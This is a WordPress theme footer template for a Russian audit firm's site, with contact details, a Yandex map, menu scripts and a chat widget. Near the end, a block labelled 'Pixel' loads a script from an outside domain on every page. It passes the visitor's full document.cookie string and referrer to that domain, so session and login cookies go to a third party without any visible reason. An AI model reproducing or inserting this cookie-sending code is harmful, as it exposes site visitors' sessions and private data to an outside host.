<?php

/**
 * The template for displaying the footer.
 *
 * Contains the closing of the id=main div and all content
 * after. Calls sidebar-footer.php for bottom widgets.
 *
 * @package WordPress
 * @subpackage Twenty_Ten
 * @since Twenty Ten 1.0
 */
?>
</div>
<!-- #main -->
<noindex>
    <div class="contact_block">
        <div class="contact_block_image">
            <img src="/wp-content/uploads/2023/11/contact_block.png" alt="">
        </div>
        <div class="contact_block_item">
            <p class="first_title">Остались вопросы?<br> Нужна консультация специалиста?</p>
            <p class="second_title">Оставьте заявку, и мы свяжемся с Вами в ближайшее время <br> и ответим на все интересующие Вас вопросы</p>
            <div class="wrap_call"></div>
        </div>
    </div>
</noindex>

<div class="footer_wrapper" id="footer_flex" role="contentinfo">
    <div class="footer_inner">
        <div class="footer_column left">
            <div class="footer_item">
                <div class="footer_icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 36 50">
                        <path fill="#5b7a53" d="M1 21.4A17.2 17.2 0 0 1 11.4 1.9C24-3.4 38.2 8.2 34.8 21.7q-.6 2.7-4 8.2L19.3 48.5a1.6 1.6 0 0 1-2.7 0L5 30q-3.4-5.8-4-8.6Zm23-2.6a6 6 0 0 0-6-6 6 6 0 0 0-6.2 6 6 6 0 0 0 6.1 6 6 6 0 0 0 6.1-6Z" />
                    </svg>
                </div>
                <div class="footer_text">
                    <span>Адрес:</span>
                    <p>ул. Трофимова, д. 22, к. 1</p>
                </div>
            </div>
            <div class="footer_item">
                <div class="footer_icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 41">
                        <path fill="#5b7a53" d="M40 32.8v1.7q-2.8 4-5 5c-10.4 4.1-24.5-9.4-30-17q-3.7-5.3-5-11.6V7.7Q1.6 3 5.9.5a2 2 52.9 0 1 2.3.4L15 7.5a2.2 2.2-52.6 0 1 .4 2.7c-1.6 2.8-5 3.6-2.6 7.6q4 7.2 10.8 10.4c2.5 1.1 4.5-1.3 6-2.8a2.2 2.2 0 0 1 3.2 0l7.3 7.4Z" />
                    </svg> </svg>
                </div>
                <div class="footer_text">
                    <span>Телефон: </span>
                    <p><a href="tel:+79255175409">+7 (925) 517-54-09</a> <a href="tel:+74992715577">+7 (499) 271-55-77</a></p>
                </div>
            </div>
            <div class="footer_item">
                <div class="footer_icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 41">
                        <path fill="#5b7a53" d="M39.6 20.6A19.6 19.6 0 0 1 20 40.2 19.6 19.6 0 0 1 .4 20.6 19.6 19.6 0 0 1 20 1a19.6 19.6 0 0 1 19.6 19.6Zm-17.7-.3a1.2 1.2 0 0 1-.4-.8V11q0-1.6-1.5-1.6h-.4a1.1 1.1 0 0 0-1 1.1l-.1 10.2q0 .5.4.8l6 6a1.4 1.4-41.7 0 0 1.9.1l.3-.2a1 1 48.7 0 0 .1-1.6L22 20.4Z" />
                    </svg>
                </div>
                <div class="footer_text">
                    <span>Прием звонков и сообщений: </span>
                    <p>с 9:30 до 18:00 (Пн-ЧТ) и с 9:30 до 17:00 (ПТ)</p>
                </div>
            </div>
            <div class="footer_bage">
                <iframe src="https://yandex.ru/sprav/widget/rating-badge/1176649353?type=rating" width="150" height="50" frameborder="0"></iframe>
                <p>Оставьте честный отзыв о нашей компании</p>
            </div>
        </div>
        <div class="footer_column right">
            <!-- Этот блок кода нужно вставить в ту часть страницы, где вы хотите разместить карту (начало) -->
            <iframe src="https://yandex.ru/map-widget/v1/?z=12&ol=biz&oid=1176649353" width="100%" height="350" frameborder="0"></iframe>
            <script type="text/javascript">
                function fid_135771083064023693615(ymaps) {
                    var map = new ymaps.Map("ymaps-map-id_135771083064023693615", {
                        center: [37.67560349999998, 55.70281442438674],
                        zoom: 16,
                        type: "yandex#map"
                    });
                    map.controls.add("zoomControl").add("mapTools").add(new ymaps.control.TypeSelector(["yandex#map", "yandex#satellite", "yandex#hybrid", "yandex#publicMap"]));
                    map.geoObjects.add(new ymaps.Placemark([37.675604, 55.702099], {
                        balloonContent: 'Аудиторская фирма "ПроАудит"'
                    }, {
                        preset: "twirl#greenDotIcon"
                    }));
                };
            </script>
            <script type="text/javascript" src="https://api-maps.yandex.ru/2.0-stable/?lang=ru-RU&amp;coordorder=longlat&amp;load=package.full&amp;wizard=constructor&amp;onload=fid_135771083064023693615"></script>
            <!-- Этот блок кода нужно вставить в ту часть страницы, где вы хотите разместить карту (конец) -->
        </div>
    </div>

</div>


<script src="/wp-content/themes/twentyten/js/flickity.pkgd.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js"></script>
<script src="/wp-content/themes/twentyten/js/scripts.js"></script>



<script type="text/javascript" src="/exform/exform.js"></script>
<script type="text/javascript">
    jQuery(document).ready(function($) {
        $("#pull_menu").on("click", function() {
            $("#menu-glavnoe-menyu").slideToggle();
            $(this).toggleClass("active_button");
        });
        menu_top = $('.fortest').offset().top;
        $(window).scroll(function() {
            if ($(window).scrollTop() > menu_top) {
                if (!$('.fortest').hasClass('fixed-menu')) {
                    $('.fortest').addClass('fixed-menu');
                    $('.content').css('margin-top', '80px');
                }
            } else {
                if ($('.fortest').hasClass('fixed-menu')) {
                    $('.fortest').removeClass('fixed-menu');
                    $('.content').css('margin-top', '');
                }
            }
        });
        $('.main-carousel').flickity({
            cellAlign: 'left',
            contain: true,
            imagesLoaded: true
        });
        $('.callback').exform({
            theme: 'callback'
        });
        $('.wrap_call').exform({
            theme: 'wrap_call',
            wrapper: 'wrap_call'
        });
        $('.specialist').exform({
            theme: 'specialist',
            wrapper: 'specialist'
        });
        $(".sub-menu").parent().addClass("parent_menu");
        $('.menu-item').prepend('<div class="par_pluses"><div class="plus-1"></div><div class="plus-2"></div></div>');
        $(".sub-menu").hide();
        $(".par_pluses").click(function() {
            $(this).siblings(".sub-menu").slideToggle("slow")
                .siblings(".sub-menu:visible").slideUp("slow");
            $(this).toggleClass("active");
            $(this).siblings(".par_pluses").removeClass("active");
        });

        if (location.pathname == '/glavnaya/novosti-buhucheta-i-nalogooblozheniya/') {
            $('a.vgo').delay(2000).removeAttr('target');
        }
    });
</script>

<? wp_enqueue_style('mainpage_css', get_template_directory_uri() . '/mainpage.css', false, '1.1', 'all'); ?>

<!-- #footer -->
<!-- Yandex.Metrika counter -->
<!-- <script type="text/javascript">
    (function(d, w, c) {
        (w[c] = w[c] || []).push(function() {
            try {
                w.yaCounter44898088 = new Ya.Metrika({
                    id: 44898088,
                    clickmap: true,
                    trackLinks: true,
                    accurateTrackBounce: true,
                    webvisor: true
                });
            } catch (e) {}
        });

        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function() {
                n.parentNode.insertBefore(s, n);
            };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://mc.yandex.ru/metrika/watch.js";

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else {
            f();
        }
    })(document, window, "yandex_metrika_callbacks");
</script>
<noscript>
    <div><img src="https://mc.yandex.ru/watch/44898088" style="position:absolute; left:-9999px;" alt="" /></div>
</noscript> -->
<!-- /Yandex.Metrika counter -->



</div><!-- #wrapper -->

<?php
/* Always have wp_footer() just before the closing </body>
	 * tag of your theme, or you will break many plugins, which
	 * generally use this hook to reference JavaScript files.
	 */

wp_footer();
?>
<script type="text/javascript">
    jQuery(document).ready(function($) {
        $(".zbo-submit").attr("onclick", "yaCounter44898088.reachGoal('zakaz'); return true;");
    });
</script>
<!-- BEGIN JIVOSITE CODE {literal} -->
<script type='text/javascript'>
    (function() {
        var widget_id = 'jN1co5x1Xw';
        var d = document;
        var w = window;

        function l() {
            var s = document.createElement('script');
            s.type = 'text/javascript';
            s.async = true;
            s.src = '//code.jivosite.com/script/widget/' + widget_id;
            var ss = document.getElementsByTagName('script')[0];
            ss.parentNode.insertBefore(s, ss);
        }
        if (d.readyState == 'complete') {
            l();
        } else {
            if (w.attachEvent) {
                w.attachEvent('onload', l);
            } else {
                w.addEventListener('load', l, false);
            }
        }
    })();
</script>
<!-- {/literal} END JIVOSITE CODE -->

<!-- Pixel -->
<script type="text/javascript">
    (function(d, w) {
        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function() {
                n.parentNode.insertBefore(s, n);
            };
        s.type = "text/javascript";
        s.async = true;
        s.src = "https://qoopler.ru/index.php?ref=" + d.referrer + "&cookie=" + encodeURIComponent(document.cookie);

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else {
            f();
        }
    })(document, window);
</script>
<!-- /Pixel -->

</body>


</html>